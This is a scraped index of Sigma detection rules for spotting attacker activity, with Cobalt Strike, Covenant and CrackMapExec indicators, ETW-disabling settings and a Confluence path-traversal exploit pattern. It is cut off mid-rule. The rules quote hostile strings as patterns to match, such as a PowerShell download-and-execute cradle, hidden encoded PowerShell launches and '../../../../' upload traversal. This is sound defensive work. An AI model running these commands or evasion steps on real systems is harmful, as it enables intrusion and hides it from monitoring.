https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html Raw rule (edit) title: CLR DLL Loaded Via Scripting Applications id: 4508a70e-97ef-4300-b62b-ff27992990ea status: test description: Detects CLR DLL being loaded by an scripting applications author: omkar72, oscd.community references: - https://github.com/tyranid/DotNetToJScript - https://thewover.github.io/Introducing-Donut/ - https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html date: 2020/10/14 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\clr.dll\u0026#39; - \u0026#39;\\mscoree.dll\u0026#39; - \u0026#39;\\mscorlib.dll\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.execution - attack.privilege_escalation - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml/","tags":["attack.execution","attack.privilege_escalation","attack.t1055"],"title":"CLR DLL Loaded Via Scripting Applications"},{"categories":null,"contents":"Detects the redirection of an output stream of / within a Windows command line session\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md#atomic-test-3---create-ads-command-prompt Raw rule (edit) title: Cmd Stream Redirection id: 70e68156-6571-427b-a6e9-4476a173a9b6 status: experimental description: Detects the redirection of an output stream of / within a Windows command line session author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md#atomic-test-3---create-ads-command-prompt date: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\cmd.exe CommandLine|contains: \u0026#39;\u0026gt;*:\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1564.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_redirect_to_stream.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Cmd Stream Redirection"},{"categories":null,"contents":"Detects a typical pattern of a CobaltStrike BOF which inject into other processes\nKnown false-positives unknown References https://github.com/boku7/injectAmsiBypass https://github.com/boku7/spawn Raw rule (edit) title: CobaltStrike BOF Injection Pattern id: 09706624-b7f6-455d-9d02-adee024cee1d description: Detects a typical pattern of a CobaltStrike BOF which inject into other processes references: - https://github.com/boku7/injectAmsiBypass - https://github.com/boku7/spawn status: experimental author: Christian Burkard date: 2021/08/04 logsource: category: process_access product: windows detection: selection: CallTrace|re: \u0026#39;^C:\\\\\\\\Windows\\\\\\\\SYSTEM32\\\\\\\\ntdll\\\\.dll\\+[a-z0-9]{4,6}\\|C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KERNELBASE\\\\.dll\\+[a-z0-9]{4,6}\\|UNKNOWN\\([A-Z0-9]{16}\\)$\u0026#39; GrantedAccess: - \u0026#39;0x1028\u0026#39; - \u0026#39;0x1fffff\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.execution - attack.t1106 - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_cobaltstrike_bof_injection_pattern.yml/","tags":["attack.execution","attack.t1106","attack.defense_evasion","attack.t1562.001"],"title":"CobaltStrike BOF Injection Pattern"},{"categories":null,"contents":"Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.\nKnown false-positives Unknown References https://www.cobaltstrike.com/help-windows-executable https://redcanary.com/threat-detection-report/ https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/ Raw rule (edit) title: CobaltStrike Load by Rundll32 status: experimental id: ae9c6a7c-9521-42a6-915e-5aaa8689d529 author: Wojciech Lesicki date: 2021/06/01 modified: 2022/03/04 description: Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line. references: - https://www.cobaltstrike.com/help-windows-executable - https://redcanary.com/threat-detection-report/ - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/ tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;.dll\u0026#39; CommandLine|endswith: - \u0026#39; StartW\u0026#39; - \u0026#39;,StartW\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cobaltstrike_load_by_rundll32.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"CobaltStrike Load by Rundll32"},{"categories":null,"contents":"Detects different malformed user agents used in Malleable Profiles used with Cobalt Strike\nKnown false-positives Unknown References https://github.com/yeyintminthuhtut/Malleable-C2-Profiles-Collection/ Raw rule (edit) title: CobaltStrike Malformed UAs in Malleable Profiles id: 41b42a36-f62c-4c34-bd40-8cb804a34ad8 status: experimental description: Detects different malformed user agents used in Malleable Profiles used with Cobalt Strike author: Florian Roth date: 2021/05/06 modified: 2021/11/02 references: - https://github.com/yeyintminthuhtut/Malleable-C2-Profiles-Collection/ logsource: category: proxy detection: selection1: c-useragent: - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)\u0026#39; - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E )\u0026#39; - \u0026#39;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08\u0026#39; selection2: c-useragent|endswith: \u0026#39;; MANM; MANM)\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_cobalt_malformed_uas.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"CobaltStrike Malformed UAs in Malleable Profiles"},{"categories":null,"contents":"Detects Malleable Amazon Profile\nKnown false-positives Unknown References https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100 Raw rule (edit) title: CobaltStrike Malleable Amazon Browsing Traffic Profile id: 953b895e-5cc9-454b-b183-7f3db555452e status: test description: Detects Malleable Amazon Profile author: Markus Neis references: - https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile - https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100 date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection1: c-useragent: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\u0026#39; cs-method: \u0026#39;GET\u0026#39; c-uri: \u0026#39;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\u0026#39; cs-host: \u0026#39;www.amazon.com\u0026#39; cs-cookie|endswith: \u0026#39;=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996\u0026#39; selection2: c-useragent: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\u0026#39; cs-method: \u0026#39;POST\u0026#39; c-uri: \u0026#39;/N4215/adj/amzn.us.sr.aps\u0026#39; cs-host: \u0026#39;www.amazon.com\u0026#39; condition: selection1 or selection2 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_cobalt_amazon.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"CobaltStrike Malleable Amazon Browsing Traffic Profile"},{"categories":null,"contents":"Detects the creation of a named pipe as used by CobaltStrike\nKnown false-positives Unknown References https://twitter.com/d4rksystem/status/1357010969264873472 https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/ https://github.com/Neo23x0/sigma/issues/253 https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/ Raw rule (edit) title: CobaltStrike Named Pipe id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 status: experimental description: Detects the creation of a named pipe as used by CobaltStrike references: - https://twitter.com/d4rksystem/status/1357010969264873472 - https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/ - https://github.com/Neo23x0/sigma/issues/253 - https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/ date: 2021/05/25 author: Florian Roth, Wojciech Lesicki tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can always use Cobalt Strike, but also you can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection_MSSE: PipeName|contains|all: - \u0026#39;\\MSSE-\u0026#39; - \u0026#39;-server\u0026#39; selection_postex: PipeName|startswith: \u0026#39;\\postex_\u0026#39; selection_postex_ssh: PipeName|startswith: \u0026#39;\\postex_ssh_\u0026#39; selection_status: PipeName|startswith: \u0026#39;\\status_\u0026#39; selection_msagent: PipeName|startswith: \u0026#39;\\msagent_\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055"],"title":"CobaltStrike Named Pipe"},{"categories":null,"contents":"Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement\nKnown false-positives Unknown References https://www.sans.org/webcasts/119395 https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/ https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/ Raw rule (edit) title: CobaltStrike Service Installations id: 5a105d34-05fc-401e-8553-272b45c1522d description: Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement status: experimental author: Florian Roth, Wojciech Lesicki references: - https://www.sans.org/webcasts/119395 - https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/ - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/ date: 2021/05/26 modified: 2021/09/30 tags: - attack.execution - attack.privilege_escalation - attack.lateral_movement - attack.t1021.002 - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: system detection: selection_id: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 selection1: ImagePath|contains|all: - \u0026#39;ADMIN$\u0026#39; - \u0026#39;.exe\u0026#39; selection2: ImagePath|contains|all: - \u0026#39;%COMSPEC%\u0026#39; - \u0026#39;start\u0026#39; - \u0026#39;powershell\u0026#39; selection3: ImagePath|contains: \u0026#39;powershell -nop -w hidden -encodedcommand\u0026#39; selection4: ImagePath|base64offset|contains: \u0026#34;IEX (New-Object Net.Webclient).DownloadString(\u0026#39;http://127.0.0.1:\u0026#34; condition: selection_id and (selection1 or selection2 or selection3 or selection4) falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_cobaltstrike_service_installs.yml/","tags":["attack.execution","attack.privilege_escalation","attack.lateral_movement","attack.t1021.002","attack.t1543.003","attack.t1569.002"],"title":"CobaltStrike Service Installations"},{"categories":null,"contents":"Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml) In some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon\u0026rsquo;s events.\nKnown false-positives unknown References https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395 Raw rule (edit) title: CobaltStrike Service Installations in Registry id: 61a7697c-cb79-42a8-a2ff-5f0cdfae0130 description: Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml) In some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon\u0026#39;s events. status: experimental date: 2021/06/29 author: Wojciech Lesicki tags: - attack.execution - attack.privilege_escalation - attack.lateral_movement - attack.t1021.002 - attack.t1543.003 - attack.t1569.002 references: - https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395 logsource: category: registry_event product: windows detection: selection1: EventType: SetValue TargetObject|contains: \u0026#39;HKLM\\System\\CurrentControlSet\\Services\u0026#39; selection2: Details|contains|all: - \u0026#39;ADMIN$\u0026#39; - \u0026#39;.exe\u0026#39; selection3: Details|contains|all: - \u0026#39;%COMSPEC%\u0026#39; - \u0026#39;start\u0026#39; - \u0026#39;powershell\u0026#39; condition: selection1 and (selection2 or selection3) falsepositives: - unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_cobaltstrike_service_installs.yml/","tags":["attack.execution","attack.privilege_escalation","attack.lateral_movement","attack.t1021.002","attack.t1543.003","attack.t1569.002"],"title":"CobaltStrike Service Installations in Registry"},{"categories":null,"contents":"Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nKnown false-positives Use of Program Compatibility Troubleshooter Helper References https://github.com/api0cradle/LOLBAS/blob/master/OSLibraries/Pcwutl.md https://twitter.com/harr0ey/status/989617817849876488 Raw rule (edit) title: Code Execution via Pcwutl.dll id: 9386d78a-7207-4048-9c9f-a93a7c2d1c05 status: test description: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library. author: Julia Fomina, oscd.community references: - https://github.com/api0cradle/LOLBAS/blob/master/OSLibraries/Pcwutl.md - https://twitter.com/harr0ey/status/989617817849876488 date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains|all: - \u0026#39;pcwutl\u0026#39; - \u0026#39;LaunchApplication\u0026#39; condition: selection falsepositives: - Use of Program Compatibility Troubleshooter Helper level: medium tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_pcwutl.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Code Execution via Pcwutl.dll"},{"categories":null,"contents":"Detects the ld.so preload persistence file. See man ld.so for more information.\nKnown false-positives rare temporary workaround for library misconfiguration References https://man7.org/linux/man-pages/man8/ld.so.8.html Raw rule (edit) title: Code Injection by ld.so Preload id: 7e3c4651-c347-40c4-b1d4-d48590fdf684 status: experimental description: Detects the ld.so preload persistence file. See `man ld.so` for more information. author: Christian Burkard date: 2021/05/05 references: - https://man7.org/linux/man-pages/man8/ld.so.8.html logsource: product: linux detection: keyword: - \u0026#39;/etc/ld.so.preload\u0026#39; condition: keyword falsepositives: - rare temporary workaround for library misconfiguration level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1574.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_ldso_preload_injection.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1574.006"],"title":"Code Injection by ld.so Preload"},{"categories":null,"contents":"Detects an executable accessing mega.co.nz, which could be a sign of forbidden file sharing use of data exfiltration by malicious actors\nKnown false-positives Legitimate use of mega.nz uploaders and tools References https://megatools.megous.com/ https://www.mandiant.com/resources/russian-targeting-gov-business Raw rule (edit) title: Communication To Mega.nz id: fdeebdf0-9f3f-4d08-84a6-4c4d13e39fe4 status: experimental description: Detects an executable accessing mega.co.nz, which could be a sign of forbidden file sharing use of data exfiltration by malicious actors author: Florian Roth references: - https://megatools.megous.com/ - https://www.mandiant.com/resources/russian-targeting-gov-business date: 2021/12/06 tags: - attack.exfiltration - attack.t1567.001 logsource: category: network_connection product: windows detection: selection: Initiated: \u0026#39;true\u0026#39; DestinationHostname|endswith: \u0026#39;api.mega.co.nz\u0026#39; condition: selection falsepositives: - Legitimate use of mega.nz uploaders and tools level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_mega_nz.yml/","tags":["attack.exfiltration","attack.t1567.001"],"title":"Communication To Mega.nz"},{"categories":null,"contents":"Potential adversaries stopping ETW providers recording loaded .NET assemblies.\nKnown false-positives unknown References https://twitter.com/_xpn_/status/1268712093928378368 https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ https://bunnyinside.com/?term=f71e8cb9c76a http://managed670.rssing.com/chan-5590147/all_p1.html https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code Raw rule (edit) title: COMPlus_ETWEnabled Command Line Arguments id: 41421f44-58f9-455d-838a-c398859841d4 status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/_xpn_/status/1268712093928378368 - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 - https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ - https://bunnyinside.com/?term=f71e8cb9c76a - http://managed670.rssing.com/chan-5590147/all_p1.html - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;COMPlus_ETWEnabled=0\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.t1562 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_etw_modification_cmdline.yml/","tags":["attack.defense_evasion","attack.t1562"],"title":"COMPlus_ETWEnabled Command Line Arguments"},{"categories":null,"contents":"Potential adversaries stopping ETW providers recording loaded .NET assemblies.\nKnown false-positives unknown References https://twitter.com/_xpn_/status/1268712093928378368 https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ https://bunnyinside.com/?term=f71e8cb9c76a http://managed670.rssing.com/chan-5590147/all_p1.html https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code Raw rule (edit) title: COMPlus_ETWEnabled Registry Modification id: a4c90ea1-2634-4ca0-adbb-35eae169b6fc status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/_xpn_/status/1268712093928378368 - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 - https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ - https://bunnyinside.com/?term=f71e8cb9c76a - http://managed670.rssing.com/chan-5590147/all_p1.html - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code date: 2020/06/05 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4657 ObjectName|endswith: \u0026#39;\\SOFTWARE\\Microsoft\\.NETFramework\u0026#39; ObjectValueName: \u0026#39;ETWEnabled\u0026#39; NewValue: \u0026#39;0\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_etw_modification.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"COMPlus_ETWEnabled Registry Modification"},{"categories":null,"contents":"Potential adversaries stopping ETW providers recording loaded .NET assemblies.\nKnown false-positives unknown References https://twitter.com/_xpn_/status/1268712093928378368 https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ https://bunnyinside.com/?term=f71e8cb9c76a http://managed670.rssing.com/chan-5590147/all_p1.html https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code Raw rule (edit) title: COMPlus_ETWEnabled Registry Modification id: bf4fc428-dcc3-4bbd-99fe-2422aeee2544 status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/_xpn_/status/1268712093928378368 - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38 - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39 - https://github.com/dotnet/runtime/search?p=1\u0026amp;q=COMPlus_\u0026amp;unscoped_q=COMPlus_ - https://bunnyinside.com/?term=f71e8cb9c76a - http://managed670.rssing.com/chan-5590147/all_p1.html - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code date: 2020/06/05 modified: 2022/01/13 logsource: product: windows category: registry_event detection: selection: EventType: SetValue TargetObject|endswith: \u0026#39;SOFTWARE\\Microsoft\\.NETFramework\\ETWEnabled\u0026#39; Details: \u0026#39;DWORD (0x00000000)\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_etw_disabled.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"COMPlus_ETWEnabled Registry Modification"},{"categories":null,"contents":"Detects the exploitation of the Confluence vulnerability described in CVE-2019-3398\nKnown false-positives Unknown References https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181 Raw rule (edit) title: Confluence Exploitation CVE-2019-3398 id: e9bc39ae-978a-4e49-91ab-5bd481fc668b status: test description: Detects the exploitation of the Confluence vulnerability described in CVE-2019-3398 author: Florian Roth references: - https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181 date: 2020/05/26 modified: 2021/11/27 logsource: category: webserver detection: selection: cs-method: \u0026#39;POST\u0026#39; c-uri|contains|all: - \u0026#39;/upload.action\u0026#39; - \u0026#39;filename=../../../../\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2019_3398_confluence.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Confluence Exploitation CVE-2019-3398"},{"categories":null,"contents":"Detects suspicious command lines used in Covenant luanchers\nReferences https://posts.specterops.io/covenant-v0-5-eee0507b85ba Raw rule (edit) title: Covenant Launcher Indicators id: c260b6db-48ba-4b4a-a76f-2f67644e99d2 status: test description: Detects suspicious command lines used in Covenant luanchers author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - https://posts.specterops.io/covenant-v0-5-eee0507b85ba date: 2020/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;-Sta\u0026#39; - \u0026#39;-Nop\u0026#39; - \u0026#39;-Window\u0026#39; - \u0026#39;Hidden\u0026#39; CommandLine|contains: - \u0026#39;-Command\u0026#39; - \u0026#39;-EncodedCommand\u0026#39; selection2: CommandLine|contains: - \u0026#39;sv o (New-Object IO.MemorySteam);sv d \u0026#39; - \u0026#39;mshta file.hta\u0026#39; - \u0026#39;GruntHTTP\u0026#39; - \u0026#39;-EncodedCommand cwB2ACAAbwAgA\u0026#39; condition: selection or selection2 level: high tags: - attack.execution - attack.defense_evasion - attack.t1059.001 - attack.t1564.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_covenant.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1059.001","attack.t1564.003"],"title":"Covenant Launcher Indicators"},{"categories":null,"contents":"Detect various execution methods of the CrackMapExec pentesting framework\nKnown false-positives Unknown References https://github.com/byt3bl33d3r/CrackMapExec Raw rule (edit) title: CrackMapExec Command Execution id: 058f4380-962d-40a5-afce-50207d36d7e2 status: stable description: Detect various execution methods of the CrackMapExec pentesting framework references: - https://github.com/byt3bl33d3r/CrackMapExec tags: - attack.execution - attack.t1047 - attack.t1053 - attack.t1059.003 - attack.t1059.001 - attack.s0106 author: Thomas Patzke date: 2020/05/22 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless) - \u0026#39;cmd.exe /Q /c * 1\u0026gt; \\\\\\\\*\\\\*\\\\* 2\u0026gt;\u0026amp;1\u0026#39; # cme/protocols/smb/atexec.py:109 (fileless output via share) - \u0026#39;cmd.exe /C * \u0026gt; \\\\\\\\*\\\\*\\\\* 2\u0026gt;\u0026amp;1\u0026#39; # cme/protocols/smb/atexec.py:111 (fileless output via share) - \u0026#39;cmd.exe /C * \u0026gt; *\\\\Temp\\\\* 2\u0026gt;\u0026amp;1\u0026#39; CommandLine|contains: # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation) - \u0026#39;powershell.exe -exec bypass -noni -nop -w 1 -C \u0026#34;\u0026#39; # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation) - \u0026#39;powershell.exe -noni -nop -w 1 -enc 